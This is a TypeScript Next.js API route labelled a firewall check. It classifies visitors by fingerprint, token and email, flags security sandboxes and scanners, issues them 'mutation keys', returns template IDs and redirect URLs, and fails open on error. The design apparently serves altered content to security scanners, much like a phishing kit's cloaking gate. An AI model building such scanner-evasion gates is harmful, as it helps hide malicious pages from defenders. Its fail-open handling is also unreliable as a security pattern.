/**
 * Firewall Check API
 * Phase 5.7: Client-side firewall check endpoint
 */

import { NextRequest, NextResponse } from 'next/server'
import { masterFirewall } from '@/lib/masterFirewall/decisionTree'
import { resolveMutation } from '@/lib/mutations/mutationTracker'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const { fingerprint, token, email } = body

    // Call master firewall
    const firewallResult = await masterFirewall(request, {
      fingerprint,
      token,
      email,
    })
    
    // Phase 5.8: Generate mutation key for scanner/sandbox
    let mutationKey: string | null = null
    const isSandbox = firewallResult.classification === 'sandbox_high' || 
                     firewallResult.classification === 'sandbox_low'
    const isScanner = firewallResult.classification === 'bot_harmful' || 
                     firewallResult.classification === 'bot_auto'
    
    if (isSandbox || isScanner) {
      // Always issue new mutation key for scanners
      mutationKey = await resolveMutation(request as any, isSandbox, isScanner)
    }

    // Return firewall result with mutation key
    return NextResponse.json({
      action: firewallResult.action,
      templateId: firewallResult.templateId,
      redirectUrl: firewallResult.redirectUrl,
      reason: firewallResult.reason,
      classification: firewallResult.classification,
      classificationScore: firewallResult.classificationScore,
      skipAttemptIncrement: firewallResult.skipAttemptIncrement,
      skipTokenBurn: firewallResult.skipTokenBurn,
      skipBehavioralChecks: firewallResult.skipBehavioralChecks,
      mutationKey: mutationKey, // Phase 5.8: Include mutation key
    })
  } catch (error) {
    // Fail open - allow through if firewall check fails
    return NextResponse.json({
      action: 'redirect', // Default to allow
      reason: ['Firewall check failed - allowing through'],
      classification: 'unknown_risk',
      classificationScore: 50,
    })
  }
}

